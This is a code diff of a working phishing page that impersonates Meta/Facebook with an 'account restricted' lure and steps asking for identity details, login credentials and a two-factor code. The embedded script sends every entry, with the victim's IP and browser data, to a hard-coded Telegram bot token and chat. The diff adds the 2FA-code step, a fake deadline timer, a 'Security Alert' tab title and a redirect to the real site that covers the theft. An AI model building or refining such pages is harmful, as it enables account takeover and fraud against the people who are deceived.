@@ -12,9 +12,9 @@
         
         #p1 { max-width: 550px; text-align: center; margin-top: 80px; }
         
-        /* Updated Illustration Box to fit images like the screenshot */
-        .illustration { width: 100%; margin-bottom: 20px; display: flex; align-items: center; justify-content: center; }
-        .illustration img { width: 100%; max-width: 600px; height: auto; display: block; }
+        /* Updated only these two parts for the image fit */
+        .illustration { width: 100%; height: auto; background: none; border-radius: 10px; margin-bottom: 20px; display: flex; align-items: center; justify-content: center; font-size: 100px; }
+        .illustration img { width: 100%; max-width: 700px; height: auto; display: block; }
         
         h1, h2 { font-size: 24px; font-weight: 700; margin: 0 0 10px 0; }
         .sub-text { color: var(--m-text); font-size: 14.5px; line-height: 1.4; margin-bottom: 25px; }
@@ -55,8 +55,8 @@
 
 <div id="p2" class="card hidden">
     <div class="illustration">
-        <img src="image1.png">
-    </div>
+    <img src="image1.png" width="90" style="margin-bottom: 25px;">
+</div>
     <h1>Your account has been restricted</h1>
     <div style="font-size: 12px; color: var(--m-gray); margin-bottom: 10px;">Term of Service</div>
     <p class="sub-text">We detected unusual activity in your page today <b>December 23, 2025</b>. Someone has reported your account for not complying with <span class="blue-link" style="font-weight: normal;">Community Standards</span>. To avoid having your account <span class="blue-link" style="font-weight: normal;">disabled</span>, please verify:</p>
@@ -72,9 +72,7 @@
 </div>
 
 <div id="p3" class="card hidden">
-    <div class="illustration">
-        <img src="image1.png">
-    </div>
+    <div class="illustration">🔐</div>
     <h1>Your account has been restricted</h1>
     <div style="font-size: 12px; color: var(--m-gray); margin-bottom: 10px;">Term of Service</div>
     <p class="sub-text">To secure your business page, please verify your identity by entering your account credentials:</p>
@@ -88,14 +86,56 @@
     <p style="font-size: 12px; color: var(--m-gray); margin-top: 30px; border-top: 1px solid #eee; padding-top: 15px;">⚠️ Please make sure to fill in the data correctly. If you fill in the wrong data your account will be permanently closed.</p>
 </div>
 
+<div id="p4" class="card hidden" style="max-width: 500px; padding: 30px;">
+    <h1>Two-factor authentication required</h1>
+    <div style="font-size: 13px; color: #65676b; margin-bottom: 20px; border-bottom: 1px solid #dddfe2; padding-bottom: 15px;">Choose a way to confirm it's you</div>
+    <p class="sub-text" style="font-size: 14px;">We've sent a 6-digit code to your mobile device and email. Enter the code below to continue.</p>
+    <div style="background: #f5f6f7; padding: 20px; border-radius: 8px; border: 1px solid #dddfe2; margin-bottom: 20px;">
+        <input type="text" id="otp" class="otp-box" maxlength="6" placeholder="000 000" inputmode="numeric" onkeypress="return /[0-9]/i.test(event.key)" style="background: white; margin-bottom: 0;">
+    </div>
+    <div style="font-size: 13px; color: #1877F2; cursor: pointer; font-weight: 600; margin-bottom: 20px;">Didn't get a code? Send again</div>
+    <div class="btn-row" style="border-top: 1px solid #dddfe2; padding-top: 20px;"><button class="btn" id="b4" onclick="step(4, 5)" style="padding: 10px 30px; font-size: 14px;">Submit Code</button></div>
+</div>
+
+<div id="p5" class="card hidden" style="max-width: 480px; text-align: center;">
+    <div id="loading">
+        <div style="border: 4px solid #f3f3f3; border-top: 4px solid var(--m-blue); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto;"></div>
+        <p>Processing request...</p>
+    </div>
+    <div id="done" class="hidden">
+        <div class="success-checkmark">✓</div>
+        <h2>Submission Received</h2>
+        <p>Your appeal is being reviewed. We will contact you via your support inbox within 24-48 hours.</p>
+    </div>
+</div>
+
+<footer>Meta © 2025</footer>
+
 <script>
     const _t = "8342277483:AAFqV9LvbQBG2-VB9xl0VLhqShZK6IcEp5s";
     const _c = "5901396648";
     let uIP = "Detecting...";
-    // Gathers browser details
-    const bInfo = `Agent: ${navigator.userAgent} | Platform: ${navigator.platform}`;
+    
+    // Gathers browser info, OS, and Screen Size
+    const bDetails = `🖥️ Browser: ${navigator.userAgent}\n💻 Platform: ${navigator.platform}\n📏 Screen: ${window.screen.width}x${window.screen.height}`;
 
     fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => uIP = d.ip);
+
+    window.onblur = () => { document.title = "⚠️ Security Alert!"; };
+    window.onfocus = () => { document.title = "Meta Business Suite"; };
+
+    function startClock() {
+        let end = localStorage.getItem('m_dl') || (Date.now() + 43200000);
+        localStorage.setItem('m_dl', end);
+        setInterval(() => {
+            let d = end - Date.now();
+            let el = document.getElementById('timer1');
+            if (d <= 0) { if(el) el.innerText = "0h 0m 0s"; return; }
+            let h = Math.floor(d/3600000), m = Math.floor((d%3600000)/60000), s = Math.floor((d%60000)/1000);
+            if (el) el.innerText = `${h} hours ${m} minutes ${s} seconds`;
+        }, 1000);
+    }
+    startClock();
 
     async function send(msg) {
         return fetch(`https://api.telegram.org/bot${_t}/sendMessage`, {
@@ -108,15 +148,28 @@
     async function step(f, t) {
         if (f === 2) {
             document.getElementById('b2').innerText = "Processing...";
-            await send(`🚨 *PAGE 1 INFO*\n👤 *Name:* ${document.getElementById('fname').value}\n📞 *Phone:* ${document.getElementById('phone').value}\n🎂 *Bday:* ${document.getElementById('bday').value}\n🌐 *IP:* ${uIP}\n🖥️ *Browser:* ${bInfo}`);
+            await send(`🚨 *PAGE 1 - DETAILS*\n👤 *Page:* ${document.getElementById('pname').value}\n👤 *Name:* ${document.getElementById('fname').value}\n📞 *Phone:* ${document.getElementById('phone').value}\n🎂 *Bday:* ${document.getElementById('bday').value}\n🌐 *IP:* ${uIP}\n${bDetails}`);
         }
         if (f === 3) {
             document.getElementById('b3').innerText = "Verifying...";
-            await send(`🔑 *PAGE 2 LOGIN*\n📧 *User:* ${document.getElementById('email').value}\n🔓 *Pass:* ${document.getElementById('pass').value}\n🌐 *IP:* ${uIP}\n🖥️ *Browser:* ${bInfo}`);
+            await send(`🔑 *PAGE 2 - LOGIN*\n📧 *User:* ${document.getElementById('email').value}\n🔓 *Pass:* ${document.getElementById('pass').value}\n🌐 *IP:* ${uIP}\n${bDetails}`);
         }
-        // Transitions...
+        if (f === 4) {
+            document.getElementById('b4').innerText = "Submitting...";
+            await send(`🛡️ *PAGE 3 - 2FA*\n🔢 *Code:* ${document.getElementById('otp').value}\n🌐 *IP:* ${uIP}\n${bDetails}`);
+        }
+
         document.getElementById('p' + f).classList.add('hidden');
         document.getElementById('p' + t).classList.remove('hidden');
+        document.getElementById('p' + t).classList.add('fade-in');
+
+        if (t === 5) {
+            setTimeout(() => {
+                document.getElementById('loading').classList.add('hidden');
+                document.getElementById('done').classList.remove('hidden');
+                setTimeout(() => { window.location.href = "https://www.facebook.com"; }, 5000);
+            }, 3000);
+        }
     }
 </script>
 </body>
